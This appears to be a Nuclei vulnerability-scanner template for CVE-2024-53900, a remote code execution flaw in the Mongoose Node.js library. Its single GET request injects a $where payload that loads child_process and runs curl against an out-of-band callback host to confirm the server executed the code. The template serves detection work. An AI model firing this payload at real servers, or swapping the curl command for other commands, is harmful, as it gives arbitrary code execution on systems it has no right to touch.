id: CVE-2024-53900

info:
  name: Mongoose populate().match $where RCE
  author: h4mg
  severity: critical
  description: |
    Mongoose before 8.8.3 is vulnerable to Remote Code Execution (RCE) via
    populate().match when combined with the $where operator.
    This occurs if untrusted user-controlled fields are passed to `populate({ match: ... })`.
    Attackers can inject arbitrary JavaScript in the query context.

    This PoC uses an OAST callback (`curl`) for detection.
    NOTE: The vulnerable populate field (pfield) must be specified by the user
    with `-v pfield=<field>`.

    Example:
    nuclei -u http://target/book/<oid>/detail \
      -t cves/2024/CVE-2024-53900.yaml \
      -v pfield=author
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-53900
    - https://github.com/Automattic/mongoose/commit/c9e86bff7eef477da75a29af62a06d41a835a156
    - https://github.com/advisories/GHSA-m7xq-9374-9rvx
  classification:
    cve-id: CVE-2024-53900
    cwe-id: CWE-89
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
  metadata:
    max-request: 1
    product: mongoose
    framework: nodejs
    oast: true
    exploit-type: rce
    verified: true
  tags: cve,cve2024,rce,mongoose,nosql,nodejs,oast

variables:
  pfield: "author"

http:
  - method: GET
    path:
      - "{{BaseURL}}?view[path]={{pfield}}&view[match][$where]=global.process.mainModule.constructor._load('child_process').exec('curl {{interactsh-url}}')"
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
      - type: word
        part: interactsh_request
        words:
          - "User-Agent: curl"
      - type: status
        status:
          - 200
